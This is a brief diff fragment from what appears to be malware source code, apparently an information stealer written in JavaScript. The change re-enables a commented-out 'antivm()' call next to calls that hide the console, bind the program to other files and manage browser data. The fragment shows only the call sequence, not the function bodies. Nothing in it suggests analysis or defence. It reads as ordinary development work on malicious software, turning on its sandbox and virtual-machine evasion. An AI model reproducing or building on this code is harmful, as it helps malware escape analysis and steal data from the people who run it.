@@ -4212,7 +4212,7 @@ function onlyUnique(item, index, array) {
 }
     main();
     hideconsole();
-    //antivm();
+    antivm();
     binder();
     initializeFolders();
     manageBrowsers();
